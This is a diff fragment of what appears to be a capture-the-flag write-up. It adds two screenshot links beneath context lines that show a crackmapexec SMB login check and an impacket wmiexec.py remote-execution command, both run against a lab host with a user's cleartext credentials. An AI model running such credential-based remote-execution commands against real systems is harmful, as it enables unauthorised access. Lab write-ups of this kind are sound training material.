@@ -153,3 +153,6 @@ crackmapexec smb 10.10.11.129 -u tristan.davies -p '0xdf0xdf!!!'
 ```
 ./wmiexec.py 'search/tristan.davies:0xdf0xdf!!!@10.10.11.129'
 ```
+![image](https://user-images.githubusercontent.com/33616880/230714809-9dd294bd-b315-40d8-b82c-082a0a133860.png)
+
+![image](https://user-images.githubusercontent.com/33616880/230714830-96b20de5-c6d6-477f-9fe4-318864d1972f.png)
